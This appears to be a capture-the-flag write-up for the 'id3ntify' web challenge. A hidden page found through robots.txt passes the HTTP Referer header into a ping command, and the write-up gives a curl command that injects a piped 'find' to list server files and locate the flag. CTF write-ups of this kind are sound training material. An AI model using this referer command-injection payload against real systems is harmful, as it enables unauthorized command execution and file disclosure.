# Best Cyber Warrior 2022 - US » id3ntify

## Prompt
Unrecorded

## Analysis
At the start of the challenge, we're given a link to the page http://wcomekgvd7rs9zrq5l3n9dwfq36ondvjy64ybevy-web.cybertalentslabs.com/.  When you nagivate to this page, there's nothing too special about it.  I always check for a robots.txt file, and when I went there, I found some pretty free chicken: a Disallow for /s3cr3t4019.php.

## Solution
The page /s3cr3t4019.php is a website that tells you what site you're coming from, or in this case, the page displays the referer as a `ping` command.  Not the most difficult problem, it's a straight shot to the flag from here.  I tested my vectors through the use of `curl`.  First, I verified that escaping the ping command worked, then I applied the bash pipe to the solution:
```
┌──(kali㉿kali)-[~/Documents/ctf/cyberbestwarrior2022/id3ntify]
└─$ curl http://wcomekgvd7rs9zrq5l3n9dwfq36ondvjy64ybevy-web.cybertalentslabs.com/s3cr3t4019.php --referer "8.8.8.8 | find /var/www/html/ -name '*flag*'"

<!DOCTYPE html>
<html>
<head>
        <title>Sup3r S3cret page!</title>
<style>
.p3 {
  font-family: "Lucida Console", "Courier New", monospace;
}
div {
  background-color: lightgrey;
  width: 500px;
  padding: 50px;
  margin: 20px;
}
</style>


</head>
<body >
        <center><h1 class="p3" style="color:red" >Welcome To our Secret Website!</h1></center>
        <hr>
        <img src="./img/gohn.png" alt="gohn is gone" width=300 height=700 align="right">
        <h2 class="p3"> We appreciate your interest in our website</h2>
        <h2 class="p3"> We log every website linking to us , Feel free to try that now !</h2>

<div>
        <h2 class="p3">You are coming from : <span style="color:red">8.8.8.8 | find /var/www/html/ -name '**'</span></h2>
        <h2 class="p3">information  :</h2>

        /var/www/html/
/var/www/html/index.html
/var/www/html/img
/var/www/html/img/Hisok.gif
/var/www/html/img/gohn.png
/var/www/html/robots.txt
/var/www/html/s3cr3t4019.php
/var/www/html/secret_8567430286
/var/www/html/secret_8567430286/flag.txt
</div>
</body>
</html>
```
Use the pipe to `cat` the file /var/www/html/secret_8567430286/flag.txt and you've got the solution.